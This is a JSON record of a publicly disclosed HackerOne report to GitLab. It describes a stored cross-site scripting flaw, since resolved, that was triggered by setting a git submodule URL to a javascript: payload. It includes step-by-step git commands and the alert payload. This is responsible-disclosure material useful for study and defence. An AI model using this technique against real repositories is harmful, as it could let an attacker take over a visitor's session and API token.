@@ -1,0 +1,144 @@
+{
+  "id": 218872,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTg4NzI=",
+  "url": "https://hackerone.com/reports/218872",
+  "title": "Stored XSS on Files overview by abusing git submodule URL",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-04-05T20:33:16.970Z",
+  "submitted_at": "2017-04-05T20:33:16.970Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-05-09T16:00:07.317Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-05-09T15:58:54.291Z",
+  "team_member_agreed_on_going_public_at": "2017-05-09T16:00:07.287Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Vulnerability description\nThere's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule. This allows an attacker to execute JavaScript in a visitor's session.\n\n# Proof of concept\nTo reproduce the issue, the attacker needs to have a project with push access. To start, make sure you're signed in and have enabled the wiki. Now, clone both repositories:\n\n```\ngit clone git@gitlab.com:user/project\ngit clone git@gitlab.com:user/project.wiki\n```\n\nNow `cd project.wiki`  and initialize the repository:\n\n```\ntouch some-file\ngit add some-file\ngit commit -am \"Added file to initialize wiki repository\"\ngit push\n```\n\nNow repeat the same in the `project` directory add the `project.wiki` as a relative git submodule to `project`:\n\n```\ntouch some-file\ngit add some-file\ngit commit -am \"Added file to initialize project repository\"\ngit push\ngit submodule add ../project.wiki wiki\ngit add wiki\ngit commit -am \"Added relative wiki module\"\ngit push\n```\n\nThis will create a `.gitmodules` file with the following contents:\n\n```\n[submodule \"wiki\"]\n  path = wiki\n  url = ../project.wiki\n```\n\nIn this file, the URL can be updated to a `javascript:` URL. It won't error because the contents of the submodule are already fetched by the `git submodule add` command. Lets change `url = ../project.wiki` to `url = javascript:alert('XSS');` (see F173589). Now commit the results and push the changes:\n\n```\ngit add .\ngit commit -am \"Updated relative URL\"\ngit push\n```\n\nNow go to the project's Files overview: https://gitlab.com/user/project/tree/master. In the overview, click the `wiki` directory, and see the JavaScript getting executed:\n\n{F173602}\n\n# Impact\nAn attacker could offload the current user's API token and impersonate the user through the API.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 173589,
+      "file_name": "gitmodules",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/173/589/1bd628480697cff0012585d31fade36798e912f0/gitmodules?response-content-disposition=attachment%3B%20filename%3D%22gitmodules%22%3B%20filename%2A%3DUTF-8%27%27gitmodules&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6HKVASHV%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123836Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICvLhS62h5N%2BeRVQ30Kd2hHMhz8kPfjFMuOpxy7iRlG5AiAVMkShHY%2Faxq8kitFh7wszvXMcsgcmKi9tdqpm50QYnCqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMOjj6wnMlyzgGU2SnKo8FQry0DQfXwab1TdGjORsy9n8eC%2BQiBq96Fv6cODW8JqlqdjX%2BMgCnhtMC6%2Ffiyyshf2refpTUq7y9yy%2FTbtdhicOFOxvjbjcH1o0wQWifiUSDxtJQrWp6h%2F3aawaisp0RC8Kudlc208teBUU1gZOoM75eZx0qvVKNIcFvDAh9ke%2BDeTX%2F8ZnTxjr%2BDfdxuWuxGnjY1YNh8XZMg9R2wgoJLEtsag2p6xB%2FTWPNJO18CHGB4DXnAnNcpKRQoSlH%2BU%2BpZLkT3HlQZS8%2FE8lv2QNepSfaQkf%2FLCLyafmC90QLacdnT0%2F%2BpEU3UH8sDsErvW3cp8TURCbTG0djl1U7tv4NZjUEPYgNsGnzLf4XSj8zToNWejkVFjuBWeZe5y8c%2BkYBvRCCEQB5Jsab91oulIK760Xyow%2BMHdBiNVssuHdw7LCXkLRWODpb%2FPd24NniTWU5RfXeUeSwPBAewZzhnBYRlNqDr4yJsfBxbOREQPSYztKP1EoCPNFv1mQWvMqmjKrVIWOQjnPEiwJ4LmXJgn7igMJ59H9ZrIWhl1LCqVtmuL%2BPI49uYYN6J2fdhibGltLGIB21Od%2BxN%2BYo8K%2FDIIXLsGDYV3x%2B88CjiCxNn%2BEzxbzWd%2BuxZHbeaH%2FV9XY5tK4pUmyTVSFoDxRxaIfHO13YvUjdavjRtk%2BVtWLk1JuLPa142xHEC7j7Be2Jr%2FDRJgYQrtno0GeOCwMrv6z358yWjy7DNsCdYGq468o0P%2F%2B7AKYoNpiMn2uLujT2GKcomDDzqj6Ho8onsS76i%2FBgEr6GIpIEYTjp0tAB88Vn2L9CT1wWSBD3lSPHkfkcfBFqvBce61c5UOatAP7Wpp4Ig4Prz0UCl2PjSkE0SBGEvLouijDAqq2uBjqyATJBnIXPs45fNnJhfFkN0jVZ0Annb8ZWvokncI9PNKMRyazA%2BJmYE457MSLJju24jIq4aXOLtDTVdyvAsXDDWxJjbi73t8f2A0l8yl37Oa2xSMrmgfWgvJrx8153JtbyXcvU2WZbbC6GPFulho8HbzIkHgW9WcAiOQUoKdYjSIEd71%2Bv7H0LhpzgsZuiHDVKXfGCbNFjlWeRmmzNI%2Bi85fxFGKx0HUwXyRIg0Re1eeBnYHs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=114793e53a46763c7d6515510485a13608b09634643c55b64261212a44d59e3d",
+      "file_size": 64,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 173602,
+      "file_name": "Screen_Shot_2017-04-05_at_13.30.31.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/173/602/acf3f39c6a89e0680b9c7d3efcfb3826fbba6144/Screen_Shot_2017-04-05_at_13.30.31.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-04-05_at_13.30.31.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-04-05_at_13.30.31.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6HKVASHV%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123836Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICvLhS62h5N%2BeRVQ30Kd2hHMhz8kPfjFMuOpxy7iRlG5AiAVMkShHY%2Faxq8kitFh7wszvXMcsgcmKi9tdqpm50QYnCqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMOjj6wnMlyzgGU2SnKo8FQry0DQfXwab1TdGjORsy9n8eC%2BQiBq96Fv6cODW8JqlqdjX%2BMgCnhtMC6%2Ffiyyshf2refpTUq7y9yy%2FTbtdhicOFOxvjbjcH1o0wQWifiUSDxtJQrWp6h%2F3aawaisp0RC8Kudlc208teBUU1gZOoM75eZx0qvVKNIcFvDAh9ke%2BDeTX%2F8ZnTxjr%2BDfdxuWuxGnjY1YNh8XZMg9R2wgoJLEtsag2p6xB%2FTWPNJO18CHGB4DXnAnNcpKRQoSlH%2BU%2BpZLkT3HlQZS8%2FE8lv2QNepSfaQkf%2FLCLyafmC90QLacdnT0%2F%2BpEU3UH8sDsErvW3cp8TURCbTG0djl1U7tv4NZjUEPYgNsGnzLf4XSj8zToNWejkVFjuBWeZe5y8c%2BkYBvRCCEQB5Jsab91oulIK760Xyow%2BMHdBiNVssuHdw7LCXkLRWODpb%2FPd24NniTWU5RfXeUeSwPBAewZzhnBYRlNqDr4yJsfBxbOREQPSYztKP1EoCPNFv1mQWvMqmjKrVIWOQjnPEiwJ4LmXJgn7igMJ59H9ZrIWhl1LCqVtmuL%2BPI49uYYN6J2fdhibGltLGIB21Od%2BxN%2BYo8K%2FDIIXLsGDYV3x%2B88CjiCxNn%2BEzxbzWd%2BuxZHbeaH%2FV9XY5tK4pUmyTVSFoDxRxaIfHO13YvUjdavjRtk%2BVtWLk1JuLPa142xHEC7j7Be2Jr%2FDRJgYQrtno0GeOCwMrv6z358yWjy7DNsCdYGq468o0P%2F%2B7AKYoNpiMn2uLujT2GKcomDDzqj6Ho8onsS76i%2FBgEr6GIpIEYTjp0tAB88Vn2L9CT1wWSBD3lSPHkfkcfBFqvBce61c5UOatAP7Wpp4Ig4Prz0UCl2PjSkE0SBGEvLouijDAqq2uBjqyATJBnIXPs45fNnJhfFkN0jVZ0Annb8ZWvokncI9PNKMRyazA%2BJmYE457MSLJju24jIq4aXOLtDTVdyvAsXDDWxJjbi73t8f2A0l8yl37Oa2xSMrmgfWgvJrx8153JtbyXcvU2WZbbC6GPFulho8HbzIkHgW9WcAiOQUoKdYjSIEd71%2Bv7H0LhpzgsZuiHDVKXfGCbNFjlWeRmmzNI%2Bi85fxFGKx0HUwXyRIg0Re1eeBnYHs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7397c6243183d971f03523ef9cd45cc2ab99477612019c0f263075e95b6378dc",
+      "file_size": 156259,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-06-08T15:58:54.332Z",
+  "allow_singular_disclosure_after": -210890382.64578855,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "ramsexy",
+    "jobert",
+    "bl4de",
+    "glc",
+    "ysx",
+    "encrypt",
+    "gamliel",
+    "supernatural",
+    "madrobot",
+    "eveeez",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
